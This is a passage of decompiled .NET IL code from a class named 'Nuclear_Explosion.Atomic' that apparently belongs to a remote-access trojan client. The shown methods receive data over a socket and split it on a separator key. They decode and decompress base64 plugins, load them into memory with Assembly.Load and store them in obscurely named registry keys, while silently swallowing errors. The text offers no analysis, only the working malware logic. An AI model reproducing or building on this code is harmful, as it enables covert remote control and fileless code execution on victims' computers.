                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0086:  pop
    IL_0087:  ldloc.2
    IL_0088:  ldc.i4.0
    IL_0089:  ldelem.u1
    IL_008a:  brtrue.s   IL_008e

    IL_008c:  br.s       IL_00ac

    IL_008e:  ldloc.1
    IL_008f:  ldc.i4.0
    IL_0090:  ldelem.ref
    IL_0091:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0096:  ldtoken    [mscorlib]System.String
    IL_009b:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_00a0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_00a5:  castclass  [mscorlib]System.String
    IL_00aa:  starg.s    ID
    IL_00ac:  ldloc.2
    IL_00ad:  ldc.i4.1
    IL_00ae:  ldelem.u1
    IL_00af:  brtrue.s   IL_00b3

    IL_00b1:  br.s       IL_00d1

    IL_00b3:  ldloc.1
    IL_00b4:  ldc.i4.1
    IL_00b5:  ldelem.ref
    IL_00b6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_00bb:  ldtoken    [mscorlib]System.Int32
    IL_00c0:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_00c5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_00ca:  unbox.any  [mscorlib]System.Int32
    IL_00cf:  starg.s    S
    IL_00d1:  ldloc.2
    IL_00d2:  ldc.i4.2
    IL_00d3:  ldelem.u1
    IL_00d4:  brtrue.s   IL_00d8

    IL_00d6:  br.s       IL_00f6

    IL_00d8:  ldloc.1
    IL_00d9:  ldc.i4.2
    IL_00da:  ldelem.ref
    IL_00db:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_00e0:  ldtoken    [mscorlib]System.String
    IL_00e5:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_00ea:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_00ef:  castclass  [mscorlib]System.String
    IL_00f4:  starg.s    H
    IL_00f6:  ldloc.2
    IL_00f7:  ldc.i4.3
    IL_00f8:  ldelem.u1
    IL_00f9:  brtrue.s   IL_00fd

    IL_00fb:  br.s       IL_011b

    IL_00fd:  ldloc.1
    IL_00fe:  ldc.i4.3
    IL_00ff:  ldelem.ref
    IL_0100:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0105:  ldtoken    [mscorlib]System.String
    IL_010a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_010f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0114:  castclass  [mscorlib]System.String
    IL_0119:  starg.s    P
    IL_011b:  ldloc.2
    IL_011c:  ldc.i4.4
    IL_011d:  ldelem.u1
    IL_011e:  brtrue.s   IL_0122

    IL_0120:  br.s       IL_0143

    IL_0122:  ldloc.1
    IL_0123:  ldc.i4.4
    IL_0124:  ldelem.ref
    IL_0125:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_012a:  ldtoken    [mscorlib]System.String
    IL_012f:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0134:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0139:  castclass  [mscorlib]System.String
    IL_013e:  stsfld     string Nuclear_Explosion.Atomic::Key
    IL_0143:  ldloc.2
    IL_0144:  ldc.i4.5
    IL_0145:  ldelem.u1
    IL_0146:  brtrue.s   IL_014a

    IL_0148:  br.s       IL_016b

    IL_014a:  ldloc.1
    IL_014b:  ldc.i4.5
    IL_014c:  ldelem.ref
    IL_014d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0152:  ldtoken    [mscorlib]System.String
    IL_0157:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_015c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0161:  castclass  [mscorlib]System.String
    IL_0166:  stsfld     string Nuclear_Explosion.Atomic::SPL
    IL_016b:  ldarg.s    M
    IL_016d:  stloc.3
    IL_016e:  ldloc.3
    IL_016f:  brfalse    IL_0243

    .try
    {
      IL_0174:  nop
      IL_0175:  ldsfld     class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.Registry::CurrentUser
      IL_017a:  ldstr      "Software\\"
      IL_017f:  ldarg.0
      IL_0180:  ldarg.0
      IL_0181:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
      IL_0186:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_018b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0190:  ldstr      "\\"
      IL_0195:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_019a:  ldarg.s    MD5
      IL_019c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01a1:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_01a6:  ldc.i4.1
      IL_01a7:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_01ac:  ldnull
      IL_01ad:  ceq
      IL_01af:  stloc.s    V_4
      IL_01b1:  ldloc.s    V_4
      IL_01b3:  brfalse.s  IL_01ed

      IL_01b5:  ldarg.0
      IL_01b6:  ldstr      "HKEY_CURRENT_USER\\SOFTWARE\\"
      IL_01bb:  ldarg.0
      IL_01bc:  ldarg.0
      IL_01bd:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
      IL_01c2:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
      IL_01c7:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01cc:  ldstr      "\\"
      IL_01d1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01d6:  ldarg.s    MD5
      IL_01d8:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_01dd:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_01e2:  ldarg.s    MD5
      IL_01e4:  ldarg.s    Bytes
      IL_01e6:  call       instance object Nuclear_Explosion.Atomic::IR(string,
                                                                        string,
                                                                        string)
      IL_01eb:  pop
      IL_01ec:  nop
      IL_01ed:  nop
      IL_01ee:  leave.s    IL_01fd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01f5:  nop
      IL_01f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01fb:  leave.s    IL_01fd

    }  // end handler
    IL_01fd:  nop
    IL_01fe:  ldarg.s    B
    IL_0200:  ldc.i4.0
    IL_0201:  ceq
    IL_0203:  stloc.s    V_5
    IL_0205:  ldloc.s    V_5
    IL_0207:  brfalse.s  IL_0241

    IL_0209:  ldarg.0
    IL_020a:  ldstr      "HKEY_CURRENT_USER\\SOFTWARE\\"
    IL_020f:  ldarg.0
    IL_0210:  ldarg.0
    IL_0211:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
    IL_0216:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
    IL_021b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0220:  ldstr      "\\"
    IL_0225:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_022a:  ldarg.s    MD5
    IL_022c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_0231:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_0236:  ldarg.s    MD5
    IL_0238:  ldarg.s    Bytes
    IL_023a:  call       instance object Nuclear_Explosion.Atomic::IR(string,
                                                                      string,
                                                                      string)
    IL_023f:  pop
    IL_0240:  nop
    IL_0241:  nop
    IL_0242:  nop
    IL_0243:  nop
    IL_0244:  ldloc.0
    IL_0245:  ret
  } // end of method Atomic::INV

  .method public instance object  LA(string B) cil managed
  {
    // Code size       23 (0x17)
    .maxstack  2
    .locals init (object V_0)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.1
    IL_0003:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
    IL_0008:  call       instance uint8[] Nuclear_Explosion.Atomic::Decompress(uint8[])
    IL_000d:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0012:  stloc.0
    IL_0013:  br.s       IL_0015

    IL_0015:  ldloc.0
    IL_0016:  ret
  } // end of method Atomic::LA

  .method public instance object  IR(string P,
                                     string N,
                                     string B) cil managed
  {
    // Code size       29 (0x1d)
    .maxstack  3
    .locals init (object V_0)
    IL_0000:  nop
    .try
    {
      IL_0001:  nop
      IL_0002:  ldarg.1
      IL_0003:  ldarg.2
      IL_0004:  ldarg.3
      IL_0005:  call       void [mscorlib]Microsoft.Win32.Registry::SetValue(string,
                                                                             string,
                                                                             object)
      IL_000a:  nop
      IL_000b:  leave.s    IL_001a

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_000d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0012:  nop
      IL_0013:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0018:  leave.s    IL_001a

    }  // end handler
    IL_001a:  nop
    IL_001b:  ldloc.0
    IL_001c:  ret
  } // end of method Atomic::IR

  .method public instance void  MAC() cil managed
  {
    // Code size       2078 (0x81e)
    .maxstack  13
    .locals init (object V_0,
             int32 V_1,
             bool V_2,
             bool V_3,
             bool V_4,
             bool V_5,
             bool V_6,
             bool V_7,
             bool V_8,
             uint8[] V_9,
             object[] V_10,
             bool[] V_11,
             bool V_12,
             class [mscorlib]System.Array V_13,
             class [mscorlib]System.Threading.Thread V_14,
             bool V_15,
             class [mscorlib]System.Array V_16,
             object V_17,
             object V_18,
             int32 V_19,
             int32 V_20,
             string& V_21,
             string& V_22,
             bool V_23)
    IL_0000:  nop
    IL_0001:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
    IL_0006:  stloc.0
    IL_0007:  ldc.i4.0
    IL_0008:  stloc.1
    IL_0009:  nop
    .try
    {
      IL_000a:  nop
      .try
      {
        IL_000b:  nop
        IL_000c:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
        IL_0011:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
        IL_0016:  call       int64 [mscorlib]System.IntPtr::op_Explicit(native int)
        IL_001b:  call       bool Nuclear_Explosion.Atomic::EmptyWorkingSet(int64)
        IL_0020:  pop
        IL_0021:  leave.s    IL_0030

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0023:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0028:  nop
        IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_002e:  leave.s    IL_0030

      }  // end handler
      IL_0030:  nop
      IL_0031:  leave.s    IL_0040

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0033:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0038:  nop
      IL_0039:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_003e:  leave.s    IL_0040

    }  // end handler
    IL_0040:  nop
    .try
    {
      IL_0041:  nop
      IL_0042:  ldarg.0
      IL_0043:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_0048:  ldnull
      IL_0049:  ceq
      IL_004b:  stloc.3
      IL_004c:  ldloc.3
      IL_004d:  brfalse.s  IL_0054

      IL_004f:  leave      IL_0460

      IL_0054:  ldarg.0
      IL_0055:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_005a:  ldnull
      IL_005b:  ldstr      "Client"
      IL_0060:  ldc.i4.0
      IL_0061:  newarr     [mscorlib]System.Object
      IL_0066:  ldnull
      IL_0067:  ldnull
      IL_0068:  ldnull
      IL_0069:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_006e:  ldnull
      IL_006f:  ldstr      "Connected"
      IL_0074:  ldc.i4.0
      IL_0075:  newarr     [mscorlib]System.Object
      IL_007a:  ldnull
      IL_007b:  ldnull
      IL_007c:  ldnull
      IL_007d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0082:  ldc.i4.0
      IL_0083:  box        [mscorlib]System.Boolean
      IL_0088:  ldc.i4.0
      IL_0089:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                       object,
                                                                                                                                       bool)
      IL_008e:  stloc.s    V_4
      IL_0090:  ldloc.s    V_4
      IL_0092:  brfalse.s  IL_0099

      IL_0094:  leave      IL_0460

      IL_0099:  ldarg.0
      IL_009a:  ldfld      bool Nuclear_Explosion.Atomic::Cn
      IL_009f:  ldc.i4.0
      IL_00a0:  ceq
      IL_00a2:  stloc.s    V_5
      IL_00a4:  ldloc.s    V_5
      IL_00a6:  brfalse.s  IL_00ad

      IL_00a8:  leave      IL_0460

      IL_00ad:  ldloc.1
      IL_00ae:  ldc.i4.1
      IL_00af:  add.ovf
      IL_00b0:  stloc.1
      IL_00b1:  ldloc.1
      IL_00b2:  ldc.i4     0x96
      IL_00b7:  cgt
      IL_00b9:  stloc.s    V_6
      IL_00bb:  ldloc.s    V_6
      IL_00bd:  brfalse    IL_0154

      IL_00c2:  ldc.i4.0
      IL_00c3:  stloc.1
      IL_00c4:  ldarg.0
      IL_00c5:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_00ca:  ldnull
      IL_00cb:  ldstr      "Client"
      IL_00d0:  ldc.i4.0
      IL_00d1:  newarr     [mscorlib]System.Object
      IL_00d6:  ldnull
      IL_00d7:  ldnull
      IL_00d8:  ldnull
      IL_00d9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_00de:  ldnull
      IL_00df:  ldstr      "Poll"
      IL_00e4:  ldc.i4.2
      IL_00e5:  newarr     [mscorlib]System.Object
      IL_00ea:  dup
      IL_00eb:  ldc.i4.0
      IL_00ec:  ldc.i4.m1
      IL_00ed:  box        [mscorlib]System.Int32
      IL_00f2:  stelem.ref
      IL_00f3:  dup
      IL_00f4:  ldc.i4.1
      IL_00f5:  ldc.i4.0
      IL_00f6:  box        [System]System.Net.Sockets.SelectMode
      IL_00fb:  stelem.ref
      IL_00fc:  ldnull
      IL_00fd:  ldnull
      IL_00fe:  ldnull
      IL_00ff:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0104:  ldarg.0
      IL_0105:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_010a:  ldnull
      IL_010b:  ldstr      "Client"
      IL_0110:  ldc.i4.0
      IL_0111:  newarr     [mscorlib]System.Object
      IL_0116:  ldnull
      IL_0117:  ldnull
      IL_0118:  ldnull
      IL_0119:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_011e:  ldnull
      IL_011f:  ldstr      "Available"
      IL_0124:  ldc.i4.0
      IL_0125:  newarr     [mscorlib]System.Object
      IL_012a:  ldnull
      IL_012b:  ldnull
      IL_012c:  ldnull
      IL_012d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_0132:  ldc.i4.0
      IL_0133:  box        [mscorlib]System.Int32
      IL_0138:  ldc.i4.0
      IL_0139:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectLessEqual(object,
                                                                                                                                  object,
                                                                                                                                  bool)
      IL_013e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::AndObject(object,
                                                                                                                     object)
      IL_0143:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_0148:  stloc.s    V_7
      IL_014a:  ldloc.s    V_7
      IL_014c:  brfalse.s  IL_0153

      IL_014e:  leave      IL_0460

      IL_0153:  nop
      IL_0154:  nop
      IL_0155:  ldarg.0
      IL_0156:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_015b:  ldnull
      IL_015c:  ldstr      "Available"
      IL_0161:  ldc.i4.0
      IL_0162:  newarr     [mscorlib]System.Object
      IL_0167:  ldnull
      IL_0168:  ldnull
      IL_0169:  ldnull
      IL_016a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_016f:  ldc.i4.0
      IL_0170:  box        [mscorlib]System.Int32
      IL_0175:  ldc.i4.0
      IL_0176:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectGreater(object,
                                                                                                                                         object,
                                                                                                                                         bool)
      IL_017b:  stloc.s    V_8
      IL_017d:  ldloc.s    V_8
      IL_017f:  brfalse    IL_0443

      IL_0184:  ldarg.0
      IL_0185:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_018a:  ldnull
      IL_018b:  ldstr      "Available"
      IL_0190:  ldc.i4.0
      IL_0191:  newarr     [mscorlib]System.Object
      IL_0196:  ldnull
      IL_0197:  ldnull
      IL_0198:  ldnull
      IL_0199:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_019e:  ldc.i4.1
      IL_019f:  box        [mscorlib]System.Int32
      IL_01a4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::SubtractObject(object,
                                                                                                                          object)
      IL_01a9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(object)
      IL_01ae:  ldc.i4.1
      IL_01af:  add.ovf
      IL_01b0:  newarr     [mscorlib]System.Byte
      IL_01b5:  stloc.s    V_9
      IL_01b7:  ldarg.0
      IL_01b8:  ldfld      object Nuclear_Explosion.Atomic::C
      IL_01bd:  ldnull
      IL_01be:  ldstr      "Client"
      IL_01c3:  ldc.i4.0
      IL_01c4:  newarr     [mscorlib]System.Object
      IL_01c9:  ldnull
      IL_01ca:  ldnull
      IL_01cb:  ldnull
      IL_01cc:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_01d1:  ldnull
      IL_01d2:  ldstr      "Receive"
      IL_01d7:  ldc.i4.4
      IL_01d8:  newarr     [mscorlib]System.Object
      IL_01dd:  dup
      IL_01de:  ldc.i4.0
      IL_01df:  ldloc.s    V_9
      IL_01e1:  stelem.ref
      IL_01e2:  dup
      IL_01e3:  ldc.i4.1
      IL_01e4:  ldc.i4.0
      IL_01e5:  box        [mscorlib]System.Int32
      IL_01ea:  stelem.ref
      IL_01eb:  dup
      IL_01ec:  ldc.i4.2
      IL_01ed:  ldloc.s    V_9
      IL_01ef:  ldlen
      IL_01f0:  conv.i4
      IL_01f1:  box        [mscorlib]System.Int32
      IL_01f6:  stelem.ref
      IL_01f7:  dup
      IL_01f8:  ldc.i4.3
      IL_01f9:  ldc.i4.0
      IL_01fa:  box        [System]System.Net.Sockets.SocketFlags
      IL_01ff:  stelem.ref
      IL_0200:  dup
      IL_0201:  stloc.s    V_10
      IL_0203:  ldnull
      IL_0204:  ldnull
      IL_0205:  ldc.i4.4
      IL_0206:  newarr     [mscorlib]System.Boolean
      IL_020b:  dup
      IL_020c:  ldc.i4.0
      IL_020d:  ldc.i4.1
      IL_020e:  stelem.i1
      IL_020f:  dup
      IL_0210:  stloc.s    V_11
      IL_0212:  ldc.i4.1
      IL_0213:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0218:  pop
      IL_0219:  ldloc.s    V_11
      IL_021b:  ldc.i4.0
      IL_021c:  ldelem.u1
      IL_021d:  brtrue.s   IL_0221

      IL_021f:  br.s       IL_0240

      IL_0221:  ldloc.s    V_10
      IL_0223:  ldc.i4.0
      IL_0224:  ldelem.ref
      IL_0225:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_022a:  ldtoken    uint8[]
      IL_022f:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_0234:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_0239:  castclass  uint8[]
      IL_023e:  stloc.s    V_9
      IL_0240:  ldloc.0
      IL_0241:  ldnull
      IL_0242:  ldstr      "Write"
      IL_0247:  ldc.i4.3
      IL_0248:  newarr     [mscorlib]System.Object
      IL_024d:  dup
      IL_024e:  ldc.i4.0
      IL_024f:  ldloc.s    V_9
      IL_0251:  stelem.ref
      IL_0252:  dup
      IL_0253:  ldc.i4.1
      IL_0254:  ldc.i4.0
      IL_0255:  box        [mscorlib]System.Int32
      IL_025a:  stelem.ref
      IL_025b:  dup
      IL_025c:  ldc.i4.2
      IL_025d:  ldloc.s    V_9
      IL_025f:  ldlen
      IL_0260:  conv.i4
      IL_0261:  box        [mscorlib]System.Int32
      IL_0266:  stelem.ref
      IL_0267:  dup
      IL_0268:  stloc.s    V_10
      IL_026a:  ldnull
      IL_026b:  ldnull
      IL_026c:  ldc.i4.3
      IL_026d:  newarr     [mscorlib]System.Boolean
      IL_0272:  dup
      IL_0273:  ldc.i4.0
      IL_0274:  ldc.i4.1
      IL_0275:  stelem.i1
      IL_0276:  dup
      IL_0277:  stloc.s    V_11
      IL_0279:  ldc.i4.1
      IL_027a:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_027f:  pop
      IL_0280:  ldloc.s    V_11
      IL_0282:  ldc.i4.0
      IL_0283:  ldelem.u1
      IL_0284:  brtrue.s   IL_0288

      IL_0286:  br.s       IL_02a7

      IL_0288:  ldloc.s    V_10
      IL_028a:  ldc.i4.0
      IL_028b:  ldelem.ref
      IL_028c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0291:  ldtoken    uint8[]
      IL_0296:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
      IL_029b:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                        class [mscorlib]System.Type)
      IL_02a0:  castclass  uint8[]
      IL_02a5:  stloc.s    V_9
      IL_02a7:  nop
      IL_02a8:  ldarg.0
      IL_02a9:  ldloc.0
      IL_02aa:  ldnull
      IL_02ab:  ldstr      "ToArray"
      IL_02b0:  ldc.i4.0
      IL_02b1:  newarr     [mscorlib]System.Object
      IL_02b6:  ldnull
      IL_02b7:  ldnull
      IL_02b8:  ldnull
      IL_02b9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_02be:  castclass  uint8[]
      IL_02c3:  call       instance string Nuclear_Explosion.Atomic::BS(uint8[])
      IL_02c8:  ldsfld     string Nuclear_Explosion.Atomic::SPL
      IL_02cd:  callvirt   instance bool [mscorlib]System.String::Contains(string)
      IL_02d2:  stloc.s    V_12
      IL_02d4:  ldloc.s    V_12
      IL_02d6:  brfalse    IL_0441

      IL_02db:  ldarg.0
      IL_02dc:  ldloc.0
      IL_02dd:  ldnull
      IL_02de:  ldstr      "ToArray"
      IL_02e3:  ldc.i4.0
      IL_02e4:  newarr     [mscorlib]System.Object
      IL_02e9:  ldnull
      IL_02ea:  ldnull
      IL_02eb:  ldnull
      IL_02ec:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_02f1:  castclass  uint8[]
      IL_02f6:  ldsfld     string Nuclear_Explosion.Atomic::SPL
      IL_02fb:  call       instance class [mscorlib]System.Array Nuclear_Explosion.Atomic::fx(uint8[],
                                                                                              string)
      IL_0300:  stloc.s    V_13
      IL_0302:  ldarg.0
      IL_0303:  ldftn      instance void Nuclear_Explosion.Atomic::'_Lambda$__R32-2'(object)
      IL_0309:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_030e:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart)
      IL_0313:  stloc.s    V_14
      IL_0315:  ldloc.s    V_14
      IL_0317:  ldloc.s    V_13
      IL_0319:  ldc.i4.1
      IL_031a:  newarr     [mscorlib]System.Object
      IL_031f:  dup
      IL_0320:  ldc.i4.0
      IL_0321:  ldc.i4.0
      IL_0322:  box        [mscorlib]System.Int32
      IL_0327:  stelem.ref
      IL_0328:  ldnull
      IL_0329:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateIndexGet(object,
